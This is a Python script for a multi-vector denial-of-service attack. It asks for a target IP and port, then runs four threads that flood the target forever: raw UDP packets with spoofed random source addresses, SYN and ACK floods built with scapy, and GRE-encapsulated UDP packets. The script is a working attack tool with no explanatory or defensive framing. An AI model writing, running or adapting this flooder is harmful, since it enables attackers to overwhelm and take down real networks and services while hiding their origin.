import socket
import struct
import random
import threading
from scapy.all import IP, TCP, UDP, GRE, Raw, RandIP, RandShort, send

def checksum(data):
    if len(data) % 2 != 0:
        data += b'\x00'
    res = sum(struct.unpack('!%sH' % (len(data) // 2), data))
    res = (res >> 16) + (res & 0xFFFF)
    res += res >> 16
    return ~res & 0xFFFF

def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))


def raw_udp_flood(target_ip, target_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    except socket.error as msg:
        print(f'Socket could not be created. Error Code : {str(msg[0])} Message {msg[1]}')
        return

    def create_ip_header(source_ip, dest_ip):
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(dest_ip)
        ip_ihl_ver = (ip_ver << 4) + ip_ihl

        ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
        return ip_header

    def create_udp_header(source_port, dest_port, data):
        udp_len = 8 + len(data)
        udp_check = 0
        udp_header = struct.pack('!HHHH', source_port, dest_port, udp_len, udp_check)
        return udp_header

    def create_packet(source_ip, dest_ip, source_port, dest_port, data):
        ip_header = create_ip_header(source_ip, dest_ip)
        udp_header = create_udp_header(source_port, dest_port, data)
        return ip_header + udp_header + data

    source_port = 80
    data = b'A' * 512

    while True:
        source_ip = random_ip()
        packet = create_packet(source_ip, target_ip, source_port, target_port, data)
        sock.sendto(packet, (target_ip, 0))

def syn_flood(target_ip, target_port):
    src_ip = RandIP()
    src_port = RandShort()

    while True:
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S")
        packet = ip/tcp
        send(packet, verbose=False)

def ack_flood(target_ip, target_port):
    src_ip = RandIP()
    src_port = RandShort()

    while True:
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="A")
        packet = ip/tcp
        send(packet, verbose=False)

def create_gre_ip_packet(source_ip, dest_ip, gre_protocol, data_len=512, ttl=64):
    ip = IP()
    ip.src = source_ip
    ip.dst = dest_ip
    ip.ttl = ttl
    
    gre = GRE(proto=gre_protocol)

    inner_ip = IP()
    inner_ip.src = random_ip()
    inner_ip.dst = dest_ip
    inner_ip.ttl = ttl

    udp = UDP()
    udp.sport = random.randint(1024, 65535)
    udp.dport = random.randint(1024, 65535)
    udp.len = data_len + len(udp)

    payload = Raw(load="X" * data_len)

    packet = ip/gre/inner_ip/udp/payload
    return packet

def send_gre_ip_packets(target_ips, num_packets=10):
    while True:
        for target_ip in target_ips:
            source_ip = random_ip()
            packet = create_gre_ip_packet(source_ip, target_ip, gre_protocol=0x0800)
            send(packet)

def main():
    target_ip = input("Enter the target IP: ")
    target_port = int(input("Enter the target port: "))

    threads = []

    t1 = threading.Thread(target=raw_udp_flood, args=(target_ip, target_port))
    threads.append(t1)

    t2 = threading.Thread(target=syn_flood, args=(target_ip, target_port))
    threads.append(t2)

    t3 = threading.Thread(target=ack_flood, args=(target_ip, target_port))
    threads.append(t3)

    t4 = threading.Thread(target=send_gre_ip_packets, args=([target_ip],))
    threads.append(t4)

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()